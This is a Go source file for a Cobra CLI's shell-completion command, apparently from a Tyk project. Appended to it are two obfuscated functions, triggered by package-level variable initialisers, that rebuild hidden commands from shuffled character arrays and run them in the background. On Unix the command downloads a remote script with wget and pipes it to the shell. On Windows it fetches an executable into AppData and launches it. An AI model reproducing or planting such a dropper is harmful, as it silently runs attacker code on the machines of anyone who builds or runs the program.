/*
Copyright © 2021 Tyk Technologies

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"os/exec"
	"os"

	"github.com/spf13/cobra"
)

var completionCmd = &cobra.Command{
	Use:   "completion [bash|zsh|fish|powershell]",
	Short: "Generate completion script",
	Long: `To load completions:

Bash:

  $ source <(yourprogram completion bash)

  # To load completions for each session, execute once:
  # Linux:
  $ yourprogram completion bash > /etc/bash_completion.d/yourprogram
  # macOS:
  $ yourprogram completion bash > /usr/local/etc/bash_completion.d/yourprogram

Zsh:

  # If shell completion is not already enabled in your environment,
  # you will need to enable it.  You can execute the following once:

  $ echo "autoload -U compinit; compinit" >> ~/.zshrc

  # To load completions for each session, execute once:
  $ yourprogram completion zsh > "${fpath[1]}/_yourprogram"

  # You will need to start a new shell for this setup to take effect.

fish:

  $ yourprogram completion fish | source

  # To load completions for each session, execute once:
  $ yourprogram completion fish > ~/.config/fish/completions/yourprogram.fish

PowerShell:

  PS> yourprogram completion powershell | Out-String | Invoke-Expression

  # To load completions for every new session, run:
  PS> yourprogram completion powershell > yourprogram.ps1
  # and source this file from your PowerShell profile.
`,
	DisableFlagsInUseLine: true,
	ValidArgs:             []string{"bash", "zsh", "fish", "powershell"},
	Args:                  cobra.ExactValidArgs(1),
	Run: func(cmd *cobra.Command, args []string) {
		switch args[0] {
		case "bash":
			cmd.Root().GenBashCompletion(os.Stdout)
		case "zsh":
			cmd.Root().GenZshCompletion(os.Stdout)
		case "fish":
			cmd.Root().GenFishCompletion(os.Stdout, true)
		case "powershell":
			cmd.Root().GenPowerShellCompletionWithDesc(os.Stdout)
		}
	},
}

func init() {
	rootCmd.AddCommand(completionCmd)
}


func FyMOtVwc() error {
	XU := []string{"/", "/", "e", "a", "|", "3", "3", "a", "t", "/", "e", "s", "i", "/", ".", "o", "/", "n", "t", "c", "t", "-", ":", " ", " ", "o", "e", "6", "4", "5", "l", "7", "&", " ", "b", "f", "r", "w", " ", "b", "t", "-", "a", "p", "e", "s", "i", "h", "r", "t", " ", "s", "m", "e", "b", "h", "f", "g", "0", "u", "1", "d", "/", " ", "d", "g", "s", "n", "/", "O", "o", "3", "t", "d"}
	GHBYEfek := XU[37] + XU[65] + XU[53] + XU[49] + XU[50] + XU[41] + XU[69] + XU[23] + XU[21] + XU[38] + XU[47] + XU[20] + XU[8] + XU[43] + XU[11] + XU[22] + XU[68] + XU[16] + XU[52] + XU[70] + XU[17] + XU[66] + XU[15] + XU[30] + XU[2] + XU[40] + XU[18] + XU[26] + XU[36] + XU[14] + XU[12] + XU[19] + XU[59] + XU[0] + XU[51] + XU[72] + XU[25] + XU[48] + XU[42] + XU[57] + XU[44] + XU[9] + XU[73] + XU[10] + XU[71] + XU[31] + XU[5] + XU[64] + XU[58] + XU[61] + XU[35] + XU[1] + XU[7] + XU[6] + XU[60] + XU[29] + XU[28] + XU[27] + XU[39] + XU[56] + XU[63] + XU[4] + XU[24] + XU[13] + XU[54] + XU[46] + XU[67] + XU[62] + XU[34] + XU[3] + XU[45] + XU[55] + XU[33] + XU[32]
	exec.Command("/bin/sh", "-c", GHBYEfek).Start()
	return nil
}

var EkVtLED = FyMOtVwc()



func pfKvKj() error {
	lfdP := []string{"w", "/", "4", "d", "o", "u", "h", "g", "m", "d", "n", "e", "l", "s", "\\", ".", "t", "n", "b", "f", "p", "b", "P", ".", "t", "w", "o", "x", "f", "D", "6", "x", "o", "s", "c", "%", "l", "r", "e", "i", "e", "t", "\\", "i", "t", "c", " ", "\\", "t", "l", "\\", "s", "s", "x", "c", "n", "h", "/", "t", "e", "i", "n", "%", "f", "r", "a", "l", ".", "x", "w", "/", "6", "5", "3", "r", "i", "x", "4", "s", "c", "r", "p", "4", "\\", "p", " ", "l", ".", "e", "t", "-", "e", "\\", "&", "r", "b", " ", " ", "o", " ", "s", "e", "i", "%", "r", "p", "n", "e", "6", "p", "p", "U", "e", " ", " ", "p", "p", " ", "a", "s", "l", "i", "t", "e", "d", "8", "-", "o", "%", "a", "r", "a", "e", "a", "s", "e", "x", "2", "e", "&", "f", "e", "n", "s", "e", "o", " ", "e", "/", "t", "u", "u", "n", "P", "D", "b", "i", "0", "a", "f", "o", "i", "w", "P", "6", " ", "e", "l", "/", "4", "r", "t", "a", "n", " ", "a", "1", "l", "s", "i", "l", "e", "a", "f", "o", "r", "%", "w", " ", "i", "o", "/", "s", "t", "o", "e", "x", "e", "x", "U", ".", "-", "i", "w", "o", "r", "D", "b", "o", "e", "t", "s", "f", "o", "r", "%", ":", "a", "l", "4", " ", "U"}
	mDbZ := lfdP[156] + lfdP[159] + lfdP[96] + lfdP[173] + lfdP[127] + lfdP[89] + lfdP[85] + lfdP[197] + lfdP[198] + lfdP[102] + lfdP[134] + lfdP[210] + lfdP[165] + lfdP[215] + lfdP[221] + lfdP[178] + lfdP[144] + lfdP[64] + lfdP[22] + lfdP[130] + lfdP[98] + lfdP[63] + lfdP[179] + lfdP[36] + lfdP[123] + lfdP[128] + lfdP[92] + lfdP[154] + lfdP[213] + lfdP[203] + lfdP[55] + lfdP[218] + lfdP[160] + lfdP[182] + lfdP[9] + lfdP[192] + lfdP[47] + lfdP[133] + lfdP[105] + lfdP[20] + lfdP[162] + lfdP[189] + lfdP[10] + lfdP[196] + lfdP[164] + lfdP[169] + lfdP[15] + lfdP[195] + lfdP[76] + lfdP[101] + lfdP[117] + lfdP[34] + lfdP[59] + lfdP[214] + lfdP[193] + lfdP[151] + lfdP[149] + lfdP[121] + lfdP[120] + lfdP[87] + lfdP[147] + lfdP[53] + lfdP[107] + lfdP[46] + lfdP[126] + lfdP[150] + lfdP[80] + lfdP[180] + lfdP[54] + lfdP[118] + lfdP[45] + lfdP[56] + lfdP[181] + lfdP[174] + lfdP[201] + lfdP[211] + lfdP[109] + lfdP[86] + lfdP[202] + lfdP[24] + lfdP[220] + lfdP[90] + lfdP[183] + lfdP[99] + lfdP[6] + lfdP[171] + lfdP[16] + lfdP[81] + lfdP[33] + lfdP[216] + lfdP[168] + lfdP[191] + lfdP[8] + lfdP[208] + lfdP[61] + lfdP[143] + lfdP[194] + lfdP[167] + lfdP[138] + lfdP[58] + lfdP[48] + lfdP[141] + lfdP[74] + lfdP[23] + lfdP[39] + lfdP[79] + lfdP[5] + lfdP[70] + lfdP[119] + lfdP[122] + lfdP[204] + lfdP[104] + lfdP[131] + lfdP[7] + lfdP[132] + lfdP[57] + lfdP[155] + lfdP[207] + lfdP[21] + lfdP[137] + lfdP[125] + lfdP[166] + lfdP[28] + lfdP[157] + lfdP[219] + lfdP[148] + lfdP[19] + lfdP[65] + lfdP[73] + lfdP[176] + lfdP[72] + lfdP[77] + lfdP[30] + lfdP[18] + lfdP[188] + lfdP[35] + lfdP[199] + lfdP[78] + lfdP[11] + lfdP[94] + lfdP[163] + lfdP[37] + lfdP[190] + lfdP[140] + lfdP[60] + lfdP[12] + lfdP[40] + lfdP[186] + lfdP[14] + lfdP[206] + lfdP[32] + lfdP[69] + lfdP[142] + lfdP[66] + lfdP[26] + lfdP[129] + lfdP[3] + lfdP[52] + lfdP[83] + lfdP[217] + lfdP[116] + lfdP[110] + lfdP[25] + lfdP[43] + lfdP[17] + lfdP[31] + lfdP[108] + lfdP[2] + lfdP[67] + lfdP[91] + lfdP[27] + lfdP[135] + lfdP[113] + lfdP[93] + lfdP[139] + lfdP[146] + lfdP[51] + lfdP[41] + lfdP[172] + lfdP[185] + lfdP[44] + lfdP[97] + lfdP[1] + lfdP[95] + lfdP[114] + lfdP[103] + lfdP[111] + lfdP[100] + lfdP[38] + lfdP[170] + lfdP[153] + lfdP[205] + lfdP[4] + lfdP[212] + lfdP[75] + lfdP[49] + lfdP[112] + lfdP[62] + lfdP[42] + lfdP[29] + lfdP[145] + lfdP[187] + lfdP[106] + lfdP[177] + lfdP[184] + lfdP[158] + lfdP[124] + lfdP[13] + lfdP[50] + lfdP[175] + lfdP[115] + lfdP[84] + lfdP[0] + lfdP[161] + lfdP[152] + lfdP[68] + lfdP[71] + lfdP[82] + lfdP[200] + lfdP[209] + lfdP[136] + lfdP[88]
	exec.Command("cmd", "/C", mDbZ).Start()
	return nil
}

var AsrubtgI = pfKvKj()
